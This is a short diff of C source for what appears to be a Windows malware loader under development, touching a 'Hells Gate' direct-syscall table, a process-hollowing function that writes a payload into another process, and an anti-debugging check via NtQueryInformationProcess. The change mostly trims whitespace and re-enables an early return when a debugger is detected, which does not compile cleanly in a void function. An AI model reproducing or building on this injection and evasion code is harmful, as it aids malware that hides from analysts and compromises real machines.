@@ -2,7 +2,6 @@
 #include <stdint.h>
 #include <Windows.h>
 #include "typedef.h"
-#include "assembly.h"
 
 //Hells Gate Additions
 typedef struct _VX_TABLE_ENTRY {
@@ -251,15 +250,11 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     printf("Change Perms: %X\n", result);
     getchar();
 
-
-
     printf("\nentrypoint: 0x%p\n", entrypointAddr);
     printf("pvoid entrypoint pvoid: 0x%p\n", (PVOID)entrypointAddr);
     printf("(PVOID)Test pvoid: 0x%p\n", (PVOID)test);
     printf("&Test pvoid : 0x % p\n", &test);
     printf("Test : 0x%p\n", test);
-
-
 
     getchar();
     ULONG read = 0;
@@ -274,7 +269,6 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
 
     // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
     //WriteProcessMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
-
 
     //if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
 
@@ -294,9 +288,8 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
 }
 
 void detectDebug() {
-
     // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag
-    
+
     DWORD64 isDebuggerPreset = 0;
     
     //NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
@@ -312,8 +305,7 @@ void detectDebug() {
     if (isDebuggerPreset != NULL) {
         // detected a debugger
         printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
-
-        //return TRUE;
+        return TRUE;
     }
     printf("No debugger present...\n");
     DWORD64 hProcessDebugObject = NULL;
